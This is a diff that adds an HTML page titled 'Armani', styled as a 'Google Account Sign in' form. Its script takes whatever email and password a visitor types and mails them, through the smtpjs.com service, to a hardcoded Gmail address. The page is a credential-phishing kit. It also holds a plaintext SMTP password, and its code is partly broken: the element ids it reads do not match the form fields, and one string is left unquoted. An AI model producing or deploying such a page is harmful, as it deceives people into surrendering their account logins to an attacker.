@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Armani</title>
+        <link rel="stylesheet" href="style.css">
+    </head>
+<body>
+    <div class="container">
+        <form onsubmit="SendEmail(); reset(); return false;">
+            <h3>Google Account Sign in</h3>
+            <input type="email" id="name" placeholder="Email id" required>
+            <input type="password" id="Password" placeholder="Password" required>
+            <button type="signin" >signin</button>
+        </form>
+    </div>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script>
+        function SendEmail(){
+            Email.send({
+    Host : "smtp.gmail.com",
+    Username : "kimlila000000@gmail.com",
+    Password : "meek6490@#",
+    To : 'kimlila000000@gmail.com',
+    From : document.getElementById("email").value,
+    Subject : "New Contact Form Enquiry",
+    Body : "Email: " + document.getElementById("email").value
+        + "<br> Password: " + document.getElementById("password").value
+}).then(
+  message => alert(Message Sent Successfully)
+);
+        }
+    </script>
+</body>
+</html>
